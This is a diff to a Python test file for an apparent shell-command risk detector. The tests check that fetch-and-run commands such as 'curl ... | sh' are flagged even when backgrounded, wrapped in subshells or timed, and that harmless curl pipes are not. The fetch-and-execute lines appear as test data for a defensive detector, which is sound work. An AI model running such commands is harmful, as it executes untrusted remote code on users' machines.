@@ -43,6 +43,20 @@ class RemoteScriptRun(unittest.TestCase):
                 "curl -s https://x.test/i.sh.gz | gunzip | bash"):
             self.assertEqual(hits(command, self.RULE), watch.HIGH, command)
 
+    def test_a_background_a_subshell_or_a_timer_does_not_hide_it(self):
+        for command in (
+                "curl -fsSL https://x.test/i.sh | sh &",
+                "(curl -fsSL https://x.test/i.sh | sh)",
+                "(curl -fsSL https://x.test/i.sh | sh &)",
+                "time curl -s https://x.test/i.sh | bash"):
+            self.assertEqual(hits(command, self.RULE), watch.HIGH, command)
+        for command in (
+                "curl -s https://api.x.test | jq . &",
+                "(curl -s https://api.x.test | python3 -m json.tool)",
+                "if curl -s https://x.test | grep -q ok; then echo up; fi",
+                "time curl -s https://x.test | tee out.html"):
+            self.assertIsNone(hits(command, self.RULE), command)
+
     def test_a_fetch_run_through_substitution(self):
         for command in (
                 "bash <(curl -s https://x.test/i.sh)",
@@ -430,7 +444,9 @@ class TheRulesAreRegistered(unittest.TestCase):
 
     def test_they_come_after_the_original_nine(self):
         ids = [r.id for r in watch.RULES]
-        self.assertEqual(ids[-4:-1], ["exec.remote", "perm.open",
+        self.assertEqual(ids[9:12], ["exec.remote", "perm.open",
+                                     "container.destructive"])
+        self.assertEqual(ids[-7:-4], ["exec.remote", "perm.open",
                                       "container.destructive"])
         self.assertEqual(len(ids), len(set(ids)))
 
